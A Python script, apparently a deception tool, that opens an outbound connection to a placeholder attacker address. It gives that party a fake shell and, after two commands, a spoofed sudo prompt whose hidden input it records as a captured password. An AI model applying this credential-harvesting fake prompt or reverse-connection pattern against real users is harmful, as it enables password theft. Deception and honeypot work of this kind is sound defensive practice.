import socket
import sys
import time
import random

ATTACKER_IP = '0.0.0.0'  # Set this to attacker's real IP
ATTACKER_PORT = 4444

FAKE_ENV = {
    "user": "webadmin",
    "hostname": "prod-web-01",
    "ip": "10.0.3.67"
}

def handle_connection(sock):
    try:
        # Initial connection banner
        sock.sendall(
            f"Connected to {FAKE_ENV['hostname']} ({FAKE_ENV['ip']})\r\n"
            f"Linux {FAKE_ENV['hostname']} 5.15.0-101-generic #111-Ubuntu\r\n"
            f"{FAKE_ENV['user']}@{FAKE_ENV['hostname']}:~$ ".encode()
        )

        cmd_count = 0
        
        while True:
            data = sock.recv(1024).decode().strip()
            if not data:
                continue

            # Print command to your terminal immediately
            print(f"\n[!] Attacker executed: {data}")
            
            cmd_count += 1
            
            # Trigger password prompt after 2 commands
            if cmd_count >= 2:
                print("[!] Triggering reauthentication...")
                sock.sendall(
                    b"\r\nSystem security daemon: session timeout, re-authentication required\r\n"
                    b"[sudo] password: \x1B[8m"
                )
                password = []
                
                while True:
                    char = sock.recv(1)
                    if char in (b'\r', b'\n'):
                        # Print captured password
                        print(f"\n[!] Password attempt: {''.join(password)}")
                        sock.sendall(
                            b"\x1B[0m\r\nSorry, try again.\r\n"
                            + f"{FAKE_ENV['user']}@{FAKE_ENV['hostname']}:~$ ".encode()
                        )
                        cmd_count = 0  # Reset command counter
                        break
                    
                    password.append(char.decode())
                    sock.sendall(b"\x08 \x08")  # Mask input
                        
                continue

            # Handle normal commands
            response = {
                'ls': 'app.log\tconfig\tindex.html\tnode_modules\tpackage.json',
                'whoami': FAKE_ENV['user'],
                'id': f"uid=1001({FAKE_ENV['user']}) gid=1001({FAKE_ENV['user']}) groups=1001({FAKE_ENV['user']})",
                'uname -a': f"Linux {FAKE_ENV['hostname']} 5.15.0-101-generic #111-Ubuntu SMP x86_64 GNU/Linux",
                'date': time.strftime("%a %b %d %H:%M:%S %Z %Y"),
                'w': " 15:23:41 up 12 days,  3:15,  1 user,  load average: 0.00, 0.01, 0.05"
            }.get(data, f"-bash: {data.split()[0]}: command not found")

            sock.sendall(
                f"\r\n{response}\r\n"
                f"{FAKE_ENV['user']}@{FAKE_ENV['hostname']}:~$ ".encode()
            )

    except (ConnectionResetError, BrokenPipeError):
        print("\n[!] Connection closed by attacker")
    finally:
        sock.close()

def main():
    while True:
        try:
            s = socket.socket()
            s.connect((ATTACKER_IP, ATTACKER_PORT))
            print(f"\n[+] Connected to attacker at {ATTACKER_IP}:{ATTACKER_PORT}")
            handle_connection(s)
        except KeyboardInterrupt:
            sys.exit("\n[!] Fake shell terminated")
        except Exception as e:
            print(f"Connection error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
